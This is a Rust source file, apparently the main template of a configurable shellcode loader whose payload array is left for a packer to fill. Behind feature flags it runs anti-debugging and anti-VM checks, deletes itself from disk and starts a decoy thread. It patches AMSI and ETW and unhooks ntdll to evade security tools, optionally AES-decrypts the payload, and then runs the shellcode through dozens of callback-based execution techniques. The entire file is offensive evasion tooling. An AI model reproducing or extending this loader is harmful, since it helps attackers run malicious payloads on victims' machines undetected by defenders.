// ============================================================================
// Main Template - Loader Entry Point
// ============================================================================

use std::ffi::c_void;

// Core modules
mod execution;
mod benign;

// Conditional modules
#[cfg(feature = "UtilitySelfDeletion")]
mod utilities;

#[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag", feature = "CheckAntiDebugProcessList", feature = "CheckAntiDebugHardwareBreakpoints", feature = "CheckAntiVMCPU", feature = "CheckAntiVMRAM", feature = "CheckAntiVMUSB", feature = "CheckAntiVMProcesses", feature = "CheckDomainJoined"))]
mod checks;

#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking"))]
mod evasion;

// AES encryption support
#[cfg(any(feature = "TinyAES", feature = "CTAES"))]
mod aes;

#[cfg(any(feature = "TinyAES", feature = "CTAES"))]
mod crypto;

#[cfg(any(feature = "TinyAES", feature = "CTAES"))]
mod args;

// Payload data (will be replaced by packer)
const ENCPAYLOAD: &[u8] = &[];

/// Run all enabled evasion techniques
#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking"))]
fn run_evasion_techniques() {
    #[cfg(feature = "EvasionNtdllUnhooking")]
    {
        let _ = evasion::amsi::unhook_ntdll();
    }

    #[cfg(feature = "EvasionAMSISimplePatch")]
    {
        let _ = evasion::amsi::patch_amsi();
    }

    #[cfg(feature = "EvasionETWSimple")]
    {
        let _ = evasion::etw::patch_etw();
    }
}

fn main() {
    // Anti-debug checks - runs all enabled checks
    #[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag", feature = "CheckAntiDebugProcessList", feature = "CheckAntiDebugHardwareBreakpoints", feature = "CheckAntiVMCPU", feature = "CheckAntiVMRAM", feature = "CheckAntiVMUSB", feature = "CheckAntiVMProcesses", feature = "CheckDomainJoined"))]
    {
        if checks::wrapper::run_all_checks() {
            std::process::exit(1);
        }
    }

    // Self-deletion utility
    #[cfg(feature = "UtilitySelfDeletion")]
    {
        let _ = utilities::utils::delete_self_from_disk();
    }

    // =======================================================================
    // Benign code execution (runs in separate thread)
    // =======================================================================
    benign::start_benign_thread();

    // =======================================================================
    // Evasion techniques
    // =======================================================================
    #[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking"))]
    run_evasion_techniques();

    // =======================================================================
    // AES decryption setup
    // =======================================================================
    #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
    let (aes_key, aes_iv) = args::parse_and_validate_aes_args();
        
    // =======================================================================
    // Execute shellcode without AES decryption
    // =======================================================================
    #[cfg(not(any(feature = "TinyAES", feature = "CTAES")))]
    {
        let shellcode = ENCPAYLOAD.to_vec();

        #[cfg(feature = "ShellcodeExecuteDefault")]
        execution::shellcode_execute_default(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteFiber")]
        execution::shellcode_execute_fiber(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteCreateTimerQueueTimer")]
        execution::shellcode_execute_createtimerqueuetimer(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumUILanguages")]
        execution::shellcode_execute_enumuilanguages(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
        execution::shellcode_execute_verifierenumerate(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumChildWindows")]
        execution::shellcode_execute_enumchildwindows(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumDesktopWindows")]
        execution::shellcode_execute_enumdesktopwindows(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumSystemLocales")]
        execution::shellcode_execute_enumsystemlocales(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteCertEnumSystemStoreLocation")]
        execution::shellcode_execute_certenumsystemstorelocation(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumWindowStations")]
        execution::shellcode_execute_enumwindowstations(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumDisplayMonitors")]
        execution::shellcode_execute_enumdisplaymonitors(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
        execution::shellcode_execute_imagegetdigeststream(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
        execution::shellcode_execute_certenumsystemstore(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumTimeFormats")]
        execution::shellcode_execute_enumtimeformats(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteCryptEnumOIDInfo")]
        execution::shellcode_execute_cryptenumoidinfo(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
        execution::shellcode_execute_immenuminputcontext(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumPropsW")]
        execution::shellcode_execute_enumpropsw(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumLanguageGroupLocalesW")]
        execution::shellcode_execute_enumlanguagegrouplocalesw(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteSymEnumProcesses")]
        execution::shellcode_execute_symenumprocesses(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteCopyFileExW")]
        execution::shellcode_execute_copyfileexw(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumObjects")]
        execution::shellcode_execute_enumobjects(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumResourceTypesW")]
        execution::shellcode_execute_enumresourcetypesw(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumPageFilesW")]
        execution::shellcode_execute_enumpagefilesw(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumDirTreeW")]
        execution::shellcode_execute_enumdirtreew(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumFontFamiliesW")]
        execution::shellcode_execute_enumfontfamiliesw(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumDesktopsW")]
        execution::shellcode_execute_enumdesktopsw(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteInitOnceExecuteOnce")]
        execution::shellcode_execute_initonceexecuteonce(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumThreadWindows")]
        execution::shellcode_execute_enumthreadwindows(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumerateLoadedModulesW64")]
        execution::shellcode_execute_enumerateloadedmodulesw64(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumFontsW")]
        execution::shellcode_execute_enumfontsw(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumCalendarInfoW")]
        execution::shellcode_execute_enumcalendarinfow(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumWindows")]
        execution::shellcode_execute_enumwindows(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteEnumPwrSchemes")]
        execution::shellcode_execute_enumpwrschemes(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteSymFindFileInPath")]
        execution::shellcode_execute_symfindfileinpath(shellcode.clone());

        #[cfg(feature = "ShellcodeExecuteFlsAlloc")]
        execution::shellcode_execute_flsalloc(shellcode.clone());
    }

    // =======================================================================
    // Execute shellcode with AES decryption
    // =======================================================================
    #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
    {
        let encrypted_shellcode = ENCPAYLOAD;
        if let Some(decrypted_shellcode) = crypto::decrypt_payload(encrypted_shellcode, &aes_key, &aes_iv) {
            #[cfg(feature = "ShellcodeExecuteDefault")]
            execution::shellcode_execute_default(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteFiber")]
            execution::shellcode_execute_fiber(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteCreateTimerQueueTimer")]
            execution::shellcode_execute_createtimerqueuetimer(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumUILanguages")]
            execution::shellcode_execute_enumuilanguages(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
            execution::shellcode_execute_verifierenumerate(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumChildWindows")]
            execution::shellcode_execute_enumchildwindows(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumDesktopWindows")]
            execution::shellcode_execute_enumdesktopwindows(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumSystemLocales")]
            execution::shellcode_execute_enumsystemlocales(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteCertEnumSystemStoreLocation")]
            execution::shellcode_execute_certenumsystemstorelocation(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumWindowStations")]
            execution::shellcode_execute_enumwindowstations(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumDisplayMonitors")]
            execution::shellcode_execute_enumdisplaymonitors(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
            execution::shellcode_execute_imagegetdigeststream(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
            execution::shellcode_execute_certenumsystemstore(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumTimeFormats")]
            execution::shellcode_execute_enumtimeformats(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteCryptEnumOIDInfo")]
            execution::shellcode_execute_cryptenumoidinfo(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
            execution::shellcode_execute_immenuminputcontext(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumPropsW")]
            execution::shellcode_execute_enumpropsw(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumLanguageGroupLocalesW")]
            execution::shellcode_execute_enumlanguagegrouplocalesw(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteSymEnumProcesses")]
            execution::shellcode_execute_symenumprocesses(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteCopyFileExW")]
            execution::shellcode_execute_copyfileexw(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumObjects")]
            execution::shellcode_execute_enumobjects(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumResourceTypesW")]
            execution::shellcode_execute_enumresourcetypesw(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumPageFilesW")]
            execution::shellcode_execute_enumpagefilesw(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumDirTreeW")]
            execution::shellcode_execute_enumdirtreew(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumFontFamiliesW")]
            execution::shellcode_execute_enumfontfamiliesw(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumDesktopsW")]
            execution::shellcode_execute_enumdesktopsw(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteInitOnceExecuteOnce")]
            execution::shellcode_execute_initonceexecuteonce(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumThreadWindows")]
            execution::shellcode_execute_enumthreadwindows(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumerateLoadedModulesW64")]
            execution::shellcode_execute_enumerateloadedmodulesw64(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumFontsW")]
            execution::shellcode_execute_enumfontsw(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumCalendarInfoW")]
            execution::shellcode_execute_enumcalendarinfow(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumWindows")]
            execution::shellcode_execute_enumwindows(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteEnumPwrSchemes")]
            execution::shellcode_execute_enumpwrschemes(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteSymFindFileInPath")]
            execution::shellcode_execute_symfindfileinpath(decrypted_shellcode.clone());

            #[cfg(feature = "ShellcodeExecuteFlsAlloc")]
            execution::shellcode_execute_flsalloc(decrypted_shellcode.clone());
        }
    }
}